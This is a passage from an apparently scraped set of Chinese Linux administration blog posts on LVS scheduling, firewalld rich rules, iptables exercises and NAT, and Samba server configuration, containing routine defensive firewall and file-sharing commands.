Connection\n​\tOverhead= Active*256+Inactive\nWLC: Weigted LC，默认调度方法\n​\tOverhead=(Active*256+Inactive)/Weight\nSED: Shortest Expect Delay\n​\tOverhead=(Active+1)*256/weight\nNQ：Never Queue，第一轮均匀分配，后续SED\nLBLC：Locality-Based LC，动态的DH算法，使用场景：根据负载状态实现正向代理\nLBLCR：LBLC with Replication，带复制功能的LBLC解决LBLC负载不均衡问题，从负载重的复制到负载轻的RS\n 总结  lvs-nat与lvs-fullnat：请求和响应报文都经由Director  lvs-nat：RIP的网关要指向DIP lvs-fullnat：RIP和DIP未必在同一IP网络，但要能通信\n lvs-dr与lvs-tun：请求报文要经由Director，但响应报文由RS直接发往Client  lvs-dr：通过封装新的MAC首部实现，通过MAC网络转发 lvs-tun：通过在原IP报文外封装新IP头实现转发，支持远距离通信\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-29-linux-vitual-server/","tags":["Linux","LB","server","cluster"],"title":"Linux Vitual Server"},{"categories":["iptables"],"contents":"摘要：\n firewalld介绍 firewalld配置命令 rich规则 伪装及端口转发  FireWalld   firewalld是CentOS 7.0新推出的管理netfilter的工具\n  firewalld是配置和监控防火墙规则的系统守护进程。可以实现iptables,ip6tables,ebtables的功能\n  firewalld服务由firewalld包提供\n  firewalld支持划分区域zone,每个zone可以设置独立的防火墙规则\n  归入zone顺序：\n 先根据数据包中源地址，将其纳为某个zone 纳为网络接口所属zone 纳入默认zone，默认为public zone,管理员可以改为其它zone    网卡默认属于public zone,lo网络接口属于trusted zone\n  Firewalld配置  firewall-cmd --get-services 查看预定义服务列表 /usr/lib/firewalld/services/*.xml预定义服务的配置 三种配置方法   firewall-config （firewall-config包）图形工具 firewall-cmd （firewalld包）命令行工具 /etc/firewalld 配置文件，一般不建议\n firewall-cmd 命令选项 $ yum install firewalld -y $ systemctl restart firewalld  参数说明：  --get-zones 列出所有可用区域 --get-default-zone 查询默认区域 --set-default-zone=\u0026lt;ZONE\u0026gt; 设置默认区域 --get-active-zones 列出当前正使用的区域 --add-source=\u0026lt;CIDR\u0026gt;[--zone=\u0026lt;ZONE\u0026gt;] 添加源地址的流量到指定区域，如果无--zone= 选项，使用默认区域 --remove-source=\u0026lt;CIDR\u0026gt; [--zone=\u0026lt;ZONE\u0026gt;] 从指定区域中删除源地址的流量，如无--zone= 选项，使用默认区域 --add-interface=\u0026lt;INTERFACE\u0026gt;[--zone=\u0026lt;ZONE\u0026gt;] 添加来自于指定接口的流量到特定区域，如果无--zone= 选项，使用默认区域 --change-interface=\u0026lt;INTERFACE\u0026gt;[--zone=\u0026lt;ZONE\u0026gt;] 改变指定接口至新的区域，如果无--zone= 选项，使用默认区域 --add-service=\u0026lt;SERVICE\u0026gt; [--zone=\u0026lt;ZONE\u0026gt;] 允许服务的流量通过，如果无--zone= 选项，使用默认区域 --add-port=\u0026lt;PORT/PROTOCOL\u0026gt;[--zone=\u0026lt;ZONE\u0026gt;] 允许指定端口和协议的流量，如果无--zone= 选项，使用默认区域 --remove-service=\u0026lt;SERVICE\u0026gt; [--zone=\u0026lt;ZONE\u0026gt;] 从区域中删除指定服务，禁止该服务流量，如果无--zone= 选项，使用默认区域 --remove-port=\u0026lt;PORT/PROTOCOL\u0026gt;[--zone=\u0026lt;ZONE\u0026gt;] 从区域中删除指定端口和协议，禁止该端口的流量，如果无--zone= 选项，使用默认区域 --reload 删除当前运行时配置，应用加载永久配置 --list-services 查看开放的服务 --list-ports 查看开放的端口 --list-all [--zone=\u0026lt;ZONE\u0026gt;] 列出指定区域的所有配置信息，包括接口，源地址，端口，服务等，如果无--zone= 选项，使用默认区域 示例  查看默认zone  firewall-cmd --get-default-zone  默认zone设为dmz  firewall-cmd --set-default-zone=dmz  在internal zone中增加源地址192.168.0.0/24的永久规则  firewall-cmd --permanent --zone=internal --add-source=192.168.1.0/24  在internal zone中增加协议mysql的永久规则  firewall-cmd --permanent –zone=internal --add-service=mysql  加载新规则以生效  firewall-cmd --reload rich-rules规则  当基本firewalld语法规则不能满足要求时，可以使用以下更复杂的规则 rich-rules 富规则，功能强,表达性语言 Direct configuration rules 直接规则，灵活性差。帮助：man 5 firewalld.direct rich规则比基本的firewalld语法实现更强的功能，不仅实现允许/拒绝，还可以实现日志syslog和auditd，也可以实现端口转发，伪装和限制速率 rich语法  rule [source] [destination] service|port|protocol|icmp-block|masquerade|forward-port [log] [audit] [accept|reject|drop]  基本用法  --add-rich-rule='\u0026lt;RULE\u0026gt;' Add \u0026lt;RULE\u0026gt; to the specified zone, or the default zone if no zone is specified. --remove-rich-rule='\u0026lt;RULE\u0026gt;' Remove \u0026lt;RULE\u0026gt; to the specified zone, or the default zone if no zone is specified. --query-rich-rule='\u0026lt;RULE\u0026gt;' Query if \u0026lt;RULE\u0026gt; has been added to the specified zone, or the default zone ifno zone is specified. Returns 0 if the rule is present, otherwise 1. --list-rich-rules Outputs all rich rules for the specified zone, or the default zone if no zone isspecified.  rich规则示例   拒绝从192.168.0.11的所有流量，当address 选项使用source 或 destination时，必须用family= ipv4 |ipv6.  $ firewall-cmd --permanent --zone=classroom --add-rich-rule='rule family=ipv4 source address=192.168.0.11/32 reject‘ 限制每分钟只有两个连接到ftp服务  firewall-cmd --add-rich-rule=‘rule service name=ftp limit value=2/m accept’ 抛弃esp（ IPsec 体系中的一种主要协议）协议的所有数据包  firewall-cmd --permanent --add-rich-rule='rule protocol value=esp drop' 接受所有192.168.1.0/24子网端口5900-5905范围的TCP流量  $ firewall-cmd --permanent --zone=vnc --add-rich-rule='rule family=ipv4 source address=192.168.1.0/24 port port=5900-5905 protocol=tcp accept' 接受ssh新连接，记录日志到syslog的notice级别，每分钟最多三条信息  $ firewall-cmd --permanent --zone=work --add-rich-rule='rule servicename=\u0026quot;ssh\u0026quot; log prefix=\u0026quot;ssh \u0026quot; level=\u0026quot;notice\u0026quot; limit value=\u0026quot;3/m\u0026quot; accept 从2001:db8::/64子网的DNS连接在5分钟内被拒绝，并记录到日志到audit,每小时最大记录一条信息  $ firewall-cmd --add-rich-rule='rule family=ipv6 source address=\u0026quot;2001:db8::/64\u0026quot; service name=\u0026quot;dns\u0026quot; audit limit value=\u0026quot;1/h\u0026quot; reject' --timeout=300 伪装和端口转发 NAT网络地址转换，firewalld支持伪装和端口转发两种NAT方式\n 伪装NAT  firewall-cmd --permanent --zone= \u0026lt;ZONE\u0026gt; --add-masquerade firewall-cmd --query-masquerade 检查是否允许伪装 firewall-cmd --add-masquerade 允许防火墙伪装IP firewall-cmd --remove-masquerade 禁止防火墙伪装IP  示例：  firewall-cmd --add-rich-rule='rule family=ipv4 source address=192.168.0.0/24 masquerade'  端口转发  将发往本机的特定端口的流量转发到本机或不同机器的另一个端口。通常要配合地址伪装才能实现\n命令行如下：\nfirewall-cmd --permanent --zone= \u0026lt;ZONE\u0026gt; --add-forward-port=port= \u0026lt;PORTNUMBER\u0026gt; :proto= \u0026lt;PROTOCOL\u0026gt; [:toport= \u0026lt;PORTNUMBER\u0026gt; ][:toaddr= ] 说明：toport= 和toaddr= 至少要指定一个  示例： 转发传入的连接9527/TCP，到防火墙的80/TCP到public zone 的192.168.0.254   firewall-cmd --add-masquerade 启用伪装 firewall-cmd --zone=public --add-forward-port=port=9527:proto=tcp:toport=80:toaddr=192.168.0.254 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-29-firewalld/","tags":["Linux","safe","server","firewalld"],"title":"firewalld"},{"categories":["iptables"],"contents":"摘要：iptabels练习题\n习题  说明：以下练习INPUT和OUTPUT默认策略均为DROP   限制本地主机的web服务器在周一不允许访问；新请求的速率不能超过100个每秒；web服务器包含了admin字符串的页面不允许访问；web服务器仅允许响应报文离开本机 在工作时间，即周一到周五的8:30-18:00，开放本机的ftp服务给172.20.0.0网络中的主机访问；数据下载请求的次数每分钟不得超过5个 开放本机的ssh服务给172.20.x.1-172.20.x.100中的主机，x为你的学号，新请求建立的速率一分钟不得超过2个；仅允许响应报文通过其服务端口离开本机 拒绝TCP标志位全部为1及全部为0的报文访问本机； 允许本机ping别的主机；但不开放别的主机ping本机  答案 one  限制本地主机的web服务器在周一不允许访问；新请求的速率不能超过100个每秒；web服务器包含了admin字符串的页面不允许访问；web服务器仅允许响应报文离开本机  #周一不允许访问：time扩展 #新请求的速率不能超过100个每秒：state扩展+limit扩展 #admin字符串的页面不允许访问：string扩展 #仅允许响应报文离开本机：tcp：80为源端口 #把正在连接的ssh设为接受 iptables -A INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -A OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #新建一个链，负责有关web服务 iptables -N web1 #1.周一不允许访问：centos7默认UTC时间 iptables -A web1 -p tcp --dport 80 -m time --weekdays 1 -j REJECT #(北京时间） iptables -A web1 -p tcp --dport 80 -m time --weekdays 7 --timestart 16:00 \\ --timestop 23:59:59 -m time --weekdays 1 --timestart 00:00 --timestop 16:00 -j REJECT #2.新请求的速率不能超过100个每秒 iptables -A web1 -p tcp --dport 80 -m state --state NEW \\ -m limit --limit 100/second -j REJECT #3.admin字符串的页面不允许访问 iptables -A OUTPUT -p tcp --sport 80 -m string --algo bm --string \u0026quot;admin\u0026quot; -j REJECT #4.仅允许响应报文离开本机 iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT #5.将新建的链加入到INPUT链 iptables -A INPUT -j web1 #6.其余关于INPUT和OUTPUT的全部DROP iptables -A OUTPUT -j DROP iptables -A INPUT -j DROP two  在工作时间，即周一到周五的8:30-18:00，开放本机的ftp服务给172.20.0.0网络中的主机访问；数据下载请求的次数每分钟不得超过5个  #允许正在链接的用户 iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #新建链 ipytables -N ftpi #ftp为多端口服务，首先把state状态的相关包和端口打开 iptables -A ftpi -m state --state ESTABLISHED -m state --state RELATED -j ACCEPT #周一到周五的8:30-18:00，开放ftp服务给172.20.0.0：tcp:21端口 iptables -A ftpi -s 172.20.0.0/16 -p tcp --dport 21 -m time \\ --timestart 00:30 --timestop 10:00 --weekdays 1,2,3,4,5 -j ACCEPT #数据下载请求的次数每分钟不得超过5个 #应该放到state状态的相关包和端口打开的前面 iptables -I ftpi -p tcp --dport 21 -m state --state RELATED \\ -m string --algo bm --string \u0026quot;get\u0026quot; -m limit --limit 5/minute -j ACCEPT #把链接放到INPUT中 iptables -A INPUT -j ftpi #剩余全丢弃 iptables -A OUTPUT -j DROP iptables -A INPUT -j DROP three  开放本机的ssh服务给172.20.x.1-172.20.x.100中的主机，x为你的学号，新请求建立的速率一分钟不得超过2个；仅允许响应报文通过其服务端口离开本机  #允许正在链接的用户 iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #新建链sshi iptables -N sshi #ssh服务给172.20.0.1-172.20.0.100中的主机，新请求建立的速率一分钟不得超过2个 iptables -A sshi -m iprange --src-rang 172.20.0.1-172.20.0.100 -p tcp \\ --dport 22 -m state --state NEW -m limit --limit 2/minute -j ACCEPT #除了新建立链接，别的指定IP ssh 链接都可以通过 iptables -A sshi -m iprange --src-rang 172.20.0.1-172.20.0.100 \\ -p tcp --dport 22 -j ACCEPT #新建链 iptables -N ssho #仅允许响应报文通过其服务端口离开本机 iptables -A ssho -m iprange --dst-rang 172.20.0.1-172.20.0.100 \\ -p tcp --sport 22 -j ACCEPT #将链接加入INPUT和OUTPUT中 iptables -I INPUT -j sshi iptables -I OUTPUT -j ssho #剩余全丢弃 iptables -A OUTPUT -j DROP iptables -A INPUT -j DROP four  拒绝TCP标志位全部为1及全部为0的报文访问本机；  #允许正在链接的用户 iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #新建链tcpi iptables -N tcpi iptables -A tcpi -p tcp --tcp-flags ALL ALL -j REJECT iptables -A tcpi -p tcp --tcp-flags ALL NONE -j REJECT #允许正在链接的用户 iptables -I INPUT -j tcpi #剩余全丢弃 iptables -A OUTPUT -j DROP iptables -A INPUT -j DROP five  允许本机ping别的主机；但不开放别的主机ping本机  #允许正在链接的用户 iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #允许OUTPUT发出请求包 iptables -I OUTPUT -p icmp --icmp-type 8/0 -j ACCEPT #允许INPUT接受回应包 iptables -I INPUT -p icmp --icmp-type 0/0 -j ACCEPT #拒绝INPUT的请求包 iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT #剩余全丢弃 iptables -A OUTPUT -j DROP iptables -A INPUT -j DROP ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-27-iptablestest/","tags":["Linux","safe","server"],"title":"IptablesTest"},{"categories":["iptables"],"contents":"摘要：\n 防火墙的概念 iptables的基本认识 iptables的组成 iptables的基本语法 iptables之forward的概念 iptables之地址转换法则 SNAT源地址转换的具体实现 DNAT目标地址转换的具体实现  安全技术  入侵检测与管理系统（Intrusion Detection Systems）：特点是不阻断任何网络访问，量化、定位来自内外网络的威胁情况，主要以提供报告和事后监督为主，有针对性的指导措施和安全决策依据。一般采用旁路部署方式； 入侵防御系统（Intrusion Prevention System）：以透明模式工作，分析数据包的内容如：溢出攻击、拒绝服务攻击、木马、蠕虫、系统漏洞等进行准确的分析判断，在判定为攻击行为后立即予以阻断，主动而有效的保护网络的安全，一般采用在线部署方式； 防火墙（ FireWall ）：隔离工具，工作在网络或主机边缘，对进出网络或主机的报文，根据事先定义好的检查规则作匹配检测，对于能够被规则所匹配的报文做出相应处理的组件，基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。  防火墙的分类  主机防火墙：服务范围为当前主机 网络防火墙：服务范围为防火墙一侧的局域网 硬件防火墙：在专用硬件级别实现部分功能的防火墙；另一个部分功能基于软件实现，Checkpoint,NetScreen 软件防火墙：运行于通用硬件平台之上的防火墙的应用软件 网络层防火墙：OSI下面第三层 应用层防火墙/代理服务器：代理网关，OSI七层  网络层防火墙   包过滤防火墙\n  网络层对数据包进行选择，选择的依据是系统内设置的过滤逻辑，被称为访问控制列表（ACL），通过检查数据流中每个数据的源地址，目的地址，所用端口号和协议状态等因素，或他们的组合来确定是否允许该数据包通过.\n  优点：对用户来说透明，处理速度快且易于维护\n  缺点：无法检查应用层数据，如病毒等\n  应用层防火墙 应用层防火墙/代理服务型防火墙（Proxy Service）\n 将所有跨越防火墙的网络通信链路分为两段 内外网用户的访问都是通过代理服务器上的“链接”来实现 优点：在应用层对数据进行检查，比较安全 缺点：增加防火墙的负载  iptables的基本认识 Netfilter组件  内核空间，集成在linux内核中 扩展各种网络服务的结构化底层框架 内核中选取五个位置放了五个hook(勾子) function(INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING)，而这五个hook function向用户开放，用户可以通过一个命令工具（iptables）向其写入规则。  $cat config-3.10.0-693.el7.x86_64 |grep -i iptables CONFIG_IP_NF_IPTABLES=m CONFIG_IP6_NF_IPTABLES=m # iptables trigger is under Netfilter config (LED target)   由信息过滤表（table）组成，包含控制IP包处理的规则集（rules），规则被分组放在链（chain）上\n  三种报文流向：\n  流入本机：PREROUTING --\u0026gt; INPUT--\u0026gt;用户空间进程 流出本机：用户空间进程 --\u0026gt;OUTPUT--\u0026gt; POSTROUTING 转发：PREROUTING --\u0026gt; FORWARD --\u0026gt; POSTROUTING iptables的组成 iptables由四个表和五个链以及一些规则组成\n 四个表table：filter、nat、mangle、raw  filter表:过滤规则表，根据预定义的规则过滤符合条件的数据包 nat表:network address translation 地址转换规则表 mangle:修改数据标记位规则表 http 80 mangle 10 https 443 mangle 10 Raw:关闭NAT表上启用的连接跟踪机制，加快封包穿越防火墙速度 优先级由高到低的顺序为:raw--\u0026gt;mangle--\u0026gt;nat--\u0026gt;filter  五个内置链chain  INPUT OUTPUT FORWARD PREROUTING POSTROUTING Netfilter表与chain对应联系\niptables 命令  DESCRIPTION   Iptables and ip6tables are used to set up, maintain, and inspect the tables of IPv4 and IPv6 packet filter rules in the Linux kernel. Several different tables may be defined. Each table contains a number of built-in chains and may also contain user-defined chains.\nEach chain is a list of rules which can match a set of packets. Each rule specifies what to do with a packet that matches. This is called a \u0026lsquo;target\u0026rsquo;, which maybe a jump to a user-defined chain in the same table.\n  选项  iptables [-t table] {-A|-C|-D} chain rule-specification ip6tables [-t table] {-A|-C|-D} chain rule-specification iptables [-t table] -I chain [rulenum] rule-specification iptables [-t table] -R chain rulenum rule-specification iptables [-t table] -D chain rulenum iptables [-t table] -S [chain [rulenum]] iptables [-t table] {-F|-L|-Z} [chain [rulenum]] [options...] iptables [-t table] -N chain iptables [-t table] -X [chain] iptables [-t table] -P chain target iptables [-t table] -E old-chain-name new-chain-name rule-specification = [matches...] [target]  系统默认的防火墙规则关闭  systemctl stop firewalld systemctl disable firewalld service iptables stop chkconfig iptables off  自己编写防火墙规则。  $ iptables -t filter -A INPUT -s 192.168.1.11 -j REJECT $ iptables -t filter -A INPUT -s 192.168.1.0/24 -j REJECT $ iptables -t filter -I INPUT 2 -s 192.168.1.18 -j REJECT $ iptables -vnL --line-numbers $ iptables -D INPUT 1  链管理：  -N：new, 自定义一条新的规则链 -X：delete，删除自定义的空的规则链 -P：Policy，设置默认策略；对filter表中的链而言，其默认策略有： ACCEPT：接受 DROP：丢弃 -E：重命名自定义链；引用计数不为0的自定义链不能够被重命名，也不能被删除 查看：  -L：list, 列出指定鏈上的所有规则，本选项须置后 -n：numberic，以数字格式显示地址和端口号 -v：verbose，详细信息 -vv 更详细 -x：exactly，显示计数器结果的精确值,而非单位转换后的易读值 --line-numbers：显示规则的序号 常用组合： --vnL --vvnxL --line-numbers -S selected,以iptables-save 命令格式显示链上规则 规则管理：  -A：append，追加 -I：insert, 插入，要指明插入至的规则编号，默认为第一条 -D：delete，删除 (1) 指明规则序号 (2) 指明规则本身 -R：replace，替换指定链上的指定规则编号 -F：flush，清空指定的规则链 -Z：zero，置零 iptables的每条规则都有两个计数器 (1) 匹配到的报文的个数 (2) 匹配到的所有报文的大小之和 chain： PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING 基本用法和扩展用法  基本匹配条件：无需加载模块，由iptables/netfilter自行提供   [!] -s, --source address[/mask][,...]：源IP地址或范围  $ iptables -A INPUT -s 192.168.1.8 -p tcp --dport 139 -j REJECT  [!] -d, --destination address[/mask][,...]：目标IP地址或范围  $ iptables -A OUTPUT -d 192.168.1.0/24 -j ACCEPT  [!] -p, --protocol protocol：指定协议，可使用数字如0（all） protocol: tcp, udp, icmp, icmpv6, udplite,esp, ah, sctp, mh or “all“ 参看：/etc/protocols  $ iptables -A INPUT -s 192.168.1.8 -p tcp --dport 445 -j REJECT  [!] -i, --in-interface name：报文流入的接口；只能应用于数据报文流入环节，只应用于INPUT、FORWARD、PREROUTING 链  ~]# iptables -A OUTPUT -o lo -j ACCEPT  [!] -o, --out-interface name：报文流出的接口；只能应用于数据报文流出的环节，只应用于 FORWARD、OUTPUT 、 POSTROUTING 链  扩展匹配条件：需要加载扩展模块（/usr/lib64/xtables/*.so），方可生效   查看帮助 man iptables-extensions (1)隐式扩展：在使用-p选项指明了特定的协议时，无需再用-m选项指明扩展模块的扩展  机制，不需要手动加载扩展模块\n tcp协议的扩展选项  [!] --source-port, --sport port[:port]：匹配报文源端口,可为端口范围 [!] --destination-port,--dport port[:port]：匹配报文目标端口,可为范围 [!] --tcp-flags mask comp  显式扩展：必须使用-m选项指明要调用的扩展模块的扩展机制，要手动加载扩展模块  [-m matchname [per-match-options]]\n$ iptables -A INPUT -p tcp --syn -j REJECT #拒绝首次tcp链接,已经链接的不拒绝 $ iptables -A INPUT -p icmp --icmp-type 8 -j REJECT #禁ping $ rpm -ql iptables | grep multiport #多端口 /usr/lib64/xtables/libxt_multiport.so $ iptables -A INPUT -p tcp -m multiport --dport 21,80,139,445 -j REJECT $ iptables -A INPUT -s IP -j ACCEPT $ iptables -A OUTPUT -s IP -j ACCEPT $ iptables -A INPUT -j REJECT $ iptables -A OUTPUT -j REJECT $ iptables -A INPUT -p tcp -m multiport --dport 22,80,139,445 -j ACCEPT $ iptables -A OUTPUT -p tcp -m multiport --sport 22,80,139,445 -j ACCEPT tips：利用telnet测试是否filter成功\n自定义链  增加自定义链\niptables -N WEB iptables -A WEB -P tcp -m multiport --dports 80,443 -j ACCEPT iptables -I INPUT -s 192.168.1.0/24 -j WEB 删除自定义链\niptables -D INPUT 1 iptables -D WEB 1 iptables -X WEB string扩展  对报文中的应用层数据做字符串模式匹配检测\n--algo {bm|kmp}：字符串匹配检测算法 bm：Boyer-Moore kmp：Knuth-Pratt-Morris --from offset 开始偏移 --to offset 结束偏移 [!] --string pattern：要检测的字符串模式 [!] --hex-string pattern：要检测字符串模式，16进制格式 例如：只要匹配到google的，全部拒绝。\niptables -A OUTPUT -m string --algo bm --string \u0026quot;google\u0026quot; -j REJECT time扩展  根据将报文到达的时间与指定的时间范围进行匹配\n--datestart YYYY[-MM[-DD[Thh[:mm[:ss]]]]] 日期 --datestop YYYY[-MM[-DD[Thh[:mm[:ss]]]]] --timestart hh:mm[:ss] 时间 --timestop hh:mm[:ss] [!] --monthdays day[,day...] 每个月的几号 [!] --weekdays day[,day...] 星期几 --kerneltz：内核时区，不建议使用，CentOS7系统默认为UTC 例如：\niptables -A INPUT -s 172.20.0.0/16 -d 172.16.100.10 -p tcp --dport 80 -m time --timestart 14:30 --timestop 18:30 --weekdays Sat,Sun --kerneltz -j DROP state扩展 根据”连接追踪机制“去检查连接的状态，较耗资源，用的也相对多，例如nat技术。   conntrack机制：追踪本机上的请求和响应之间的关系 状态有如下几种：  NEW：新发出请求；连接追踪信息库中不存在此连接的相关信息条目，因此，将其识别为第一次发出的请求 ESTABLISHED：NEW状态之后，连接追踪信息库中为其建立的条目失效之前期间内所进行的通信状态 RELATED：新发起的但与已有连接相关联的连接，如：ftp协议中的数据连接与命令连接之间的关系 INVALID：无效的连接，如flag标记不正确 UNTRACKED：未进行追踪的连接，如raw表中关闭追踪 例如：\niptables -I INPUT 1 -s 192.168.1.0/24 -m state --state NEW -j REJECT iptables -I INPPUT 1 -m state --state ESTABLISHED -j ACCEPT iptables的链接跟踪表最大容量为/proc/sys/net/nf_conntrack_max，各种状态的超时链接会从表中删除；当模板满载时，后续连接可能会超时\n(1) 加大 nf_conntrack_max 值 vi /etc/sysctl.conf net.nf_conntrack_max = 393216 net.netfilter.nf_conntrack_max = 393216 (2) 降低 nf_conntrack timeout 时间 vi /etc/sysctl.conf net.netfilter.nf_conntrack_tcp_timeout_established = 300 net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120 net.netfilter.nf_conntrack_tcp_timeout_close_wait = 60 net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120 iptables策略总结 任何不允许的访问，应该在请求到达时给予拒绝 规则在链接上的次序即为其检查时的生效次序\n 基于上述，规则优化    安全放行所有入站和出站的状态为ESTABLISHED状态连接 谨慎放行入站的新请求 有特殊目的限制访问功能，要在放行规则之前加以拒绝 同类规则（访问同一应用），匹配范围小的放在前面，用于特殊处理 不同类的规则（访问不同应用），匹配范围大的放在前面 应该将那些可由一条规则能够描述的多个规则合并为一条 设置默认策略，建议白名单（只放行特定连接） a. iptables -P，不建议 b. 建议在规则的最后定义规则做为默认策略   iptables具体应用试验  试验拓扑图如下:  内网用户：192.168.1.0/24\nrouter：192.168.1.0/24 ; 10.0.0.254/8,注意：这里假想10.0.0.0/8为所有的外网用户，且用linux主机充当。\n外网：10.0.0.0/8 ； 外网web：10.0.0.8/8 ； 外网的client：10.0.0.17/8\n实现内网安全 只需在防火墙上的router上添加几条规则即可。\n要求：有客户端想访问192.168.1.18:80的web资源，并且内网用户能访问外网\n$ echo \u0026quot;net.ipv4.ip_forward = 1\u0026quot; \u0026gt;\u0026gt; /etc/sysctl.conf $ systcl -p $ iptables -A FORWARD -j REJECT $ iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT $ iptables -I FORWARD 2 -s 192.168.1.0/24 -d 0.0.0.0/0 -m state --state NEW -j ACCEPT $ iptables -I FORWARD 2 -d 192.168.1.0/24 -p tcp --dport 80 -m state --state NEW -j ACCEPT NAT  NAT: network address translation   PREROUTING，INPUT，OUTPUT，POSTROUTING 请求报文：修改源/目标IP，由定义如何修改 响应报文：修改源/目标IP，根据跟踪机制自动实现\n  SNAT：source NAT POSTROUTING, INPUT   让本地网络中的主机通过某一特定地址访问外部网络，实现地址伪装 请求报文：修改源IP\n  DNAT：destination NAT PREROUTING , OUTPUT   把本地网络中的主机上的某服务开放给外部网络访问(发布服务和端口映射)，但隐藏真实IP 请求报文：修改目标IP\n  PNAT: port nat，端口和IP都进行修改  SNAT  SNAT：固定IP  --to-source [ipaddr[-ipaddr]][:port[-port]] --random iptables -t nat -A POSTROUTING -s LocalNET -j SNAT --t-soutce ExtIP 示例，依旧利用上述网络拓扑试验图，在router上设置，：\n$ echo \u0026quot;net.ipv4.ip_forward = 1\u0026quot; \u0026gt;\u0026gt; /etc/sysctl.conf $ sysctl -p $ iptables -t nat -A POSTROUTING -s 192.168.1.0/24 ! -d 192.168.1.0/24 -j SNAT --to-source 10.0.0.254  MASQUERADE：动态IP，如拨号网络  --to-ports port[-port] --random iptables -t nat -A POSTROUTING -s LocalNET ! -d LocalNet -j MASQUERADE 示例：\niptables -t nat -A POSTROUTING -s 192.168.1.0/24 ! -d 192.168.1.0/24 -j MASQUERADE DNAT  DNAT  --to-destination [ipaddr[-ipaddr]][:port[-port]] iptables -t nat -A PREROUTING -d ExtIP -p tcp|udp --dport PORT -j DNAT --to-destination InterSeverIP[:PORT]  示例，依旧是上面的网络拓扑试验图router上进行设置：  $ iptables -t nat -A PREROUTING -s 0/0 -d 10.0.0.254 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.18:80 $ iptables -vnL -t nat  端口转发  $ iptables -t nat -A PREROUTING -d 192.168.1.18 -p tcp --dport 80 -j REDIRECT --to-port 8080 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-26-iptables/","tags":["Linux","safe"],"title":"iptables"},{"categories":["internet"],"contents":"摘要：Samba服务简介，配置文件解释，多用户挂载Samba；\nSAMBA服务简介  SMB：Server Message Block服务器消息块，IBM发布，最早是DOS网络文件共享协议 Cifs：common internet file system，微软基于SMB发布 SAMBA:1991年Andrew Tridgell,实现windows和UNIX相通 SAMBA的功能：   共享文件和打印，实现在线编辑 实现登录SAMBA用户的身份认证 可以进行NetBIOS名称解析 外围设备共享\n  计算机网络管理模式：   工作组WORKGROUP：计算机对等关系，帐号信息各自管理 域DOMAIN:C/S结构，帐号信息集中管理，DC,AD\n  相关包：   Samba 提供smb服务 Samba-client 客户端软件 samba-common 通用软件 cifs-utils smb客户端工具 samba-winbind 和AD相关\n  相关服务进程：  smbd 提供smb（cifs）服务 TCP:139,445 nmbd NetBIOS名称解析 UDP:137,138   主配置文件：/etc/samba/smb.conf 帮助参看：man smb.conf\n  语法检查： testparm [-v][/etc/samba/smb.conf]\n  客户端工具：smbclient,mount.cifs\n  Samba服务器设置   smb.conf继承了.ini文件的格式，用分成不同的部分\n  全局设置： [global] 服务器通用或全局设置的部分\n  特定共享设置：\n[homes] 用户的家目录共享 [printers] 定义打印机资源和服务 [sharename] 自定义的共享目录配置\n  其中：#和;开头的语句为注释，大小写不敏感\n  宏定义：\n   %m 客户端主机的NetBIOS名 %M 客户端主机的FQDN %H 当前用户家目录路径 %U 当前用户用户名 %g 当前用户所属组 %h samba服务器的主机名 %L samba服务器的NetBIOS %I 客户端主机的IP %T 当前日期和时间 %S 可登录的用户名 global设置  workgroup 指定工作组名称 server string 主机注释信息 netbios name 指定NetBIOS名 interfaces 指定服务侦听接口和IP hosts allow 可用“,” ，空格，或tab分隔，默认允许所有主机访问，也可在每个共享独立配置，如在[global]设置，将应用并覆盖所有共享设置  IPv4 network/prefix: 172.25.0.0/24 IPv4前缀: 172.25.0. IPv4 network/netmask: 172.25.0.0/255.255.255.0 主机名: desktop.example.com 以example.com后缀的主机名: .example.com 示例： hosts allow = 172.25. hosts allow = 172.25. .example.com  hosts deny 拒绝指定主机访问 config file=/etc/samba/conf.d/%U 用户独立的配置文件 Log file=/var/log/samba/log.%m 不同客户机采用不同日志 max log size=50 日志文件达到50K，将轮循rotate,单位KB Security三种认证方式：  share：匿名(CentOS7不再支持) user：samba用户（采有linux用户，samba的独立口令） domain:使用DC（DOMAIN CONTROLLER)认证  passdb backend = tdbsam 密码数据库格式 实现samba用户：  包： samba-common-tools 工具：smbpasswd pdbedit samba用户须是Linux用户，建议使用/sbin/nologin 配置目录共享  每个共享目录应该有独立的部分  [共享名称] 远程网络看到的共享名称 comment 注释信息 path 所共享的目录路径 public 能否被guest访问的共享，默认no，和guest ok 类似 browsable 是否允许所有用户浏览此共享,默认为yes,no为隐藏 writable=yes 可以被所有用户读写，默认为no read only=no 和writable=yes等价，如与以上设置冲突，放在后面的设置生效，默认只读 write list 三种形式：用户，@组名，+组名,用，分隔如writable=no，列表中用户或组可读写，不在列表中用户只读 valid users 特定用户才能访问该共享，如为空，将允许所有用户，用户名之间用空格分隔 samba用户访问  UNC路径: Universal Naming Convention,通用命名规范 格式：\\\\sambaserver\\sharename 终端下使用smbclient登录服务器  smbclient -L instructor.example.com smbclient -L instructor.example.com -U wang \u0026gt; cd directory \u0026gt; get file1 \u0026gt; put file2 smbclient //instructor.example.com/shared -U wang 